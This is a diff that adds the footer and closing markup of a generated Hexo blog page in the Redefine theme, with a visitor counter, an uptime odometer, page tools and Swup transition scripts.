+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
